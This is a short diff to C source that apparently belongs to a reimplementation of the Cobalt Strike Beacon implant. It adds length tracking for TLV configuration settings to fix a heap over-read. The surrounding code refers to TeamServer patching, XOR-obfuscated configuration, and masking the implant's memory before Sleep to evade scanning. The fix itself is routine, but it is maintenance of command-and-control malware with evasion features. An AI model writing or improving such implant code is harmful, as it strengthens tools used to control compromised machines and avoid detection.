@@ -29,6 +29,18 @@ setting * settings;
 setting * guard_settings;
 void    * beacon_ptr;
 
+/* byte length of each TYPE_PTR setting's malloc'd blob (0 = not a ptr
+ * setting). Consumers walking a setting's TLVs need the real allocation
+ * size - guessing a constant over-reads the heap when the setting is
+ * shorter (see hostprof_reload). */
+static unsigned int setting_lengths[128];
+
+unsigned int setting_length(int field) {
+	if (field < 0 || field >= 128)
+		return 0;
+	return setting_lengths[field];
+}
+
 /* 4.9.1 TeamServer writes exactly Settings.PATCH_SIZE bytes at AAAABBBB
  * (see BeaconPayload.java / Settings.java). The template allocation is larger
  * so 4.5's 4096-byte blob still fits. Checksum and XOR 0x2E cover this length. */
@@ -351,6 +363,7 @@ static void parse_tlv_table(setting * table, int ntable, char * blob, int bloble
 			table[index].value.p_value = (char *)malloc(length);
 			if (table[index].value.p_value == NULL)
 				break;
+			setting_lengths[index] = length;
 			memcpy(table[index].value.p_value, ptr, length);
 			/* Gargle sections table is walked during XOR; masking it in
 			 * heap_records encrypts the walk list before Sleep. */
@@ -378,6 +391,7 @@ void settings_init(void * bptr) {
 	settings = (setting *)malloc(sizeof(setting) * 128);
 	memset(settings, 0, sizeof(setting) * 128);
 	track_memory_add(settings, sizeof(setting) * 128, TRACK_MEMORY_MALLOC, TRUE, NULL);
+	memset(setting_lengths, 0, sizeof(setting_lengths));
 
 	guard_settings = (setting *)malloc(sizeof(setting) * 128);
 	memset(guard_settings, 0, sizeof(setting) * 128);
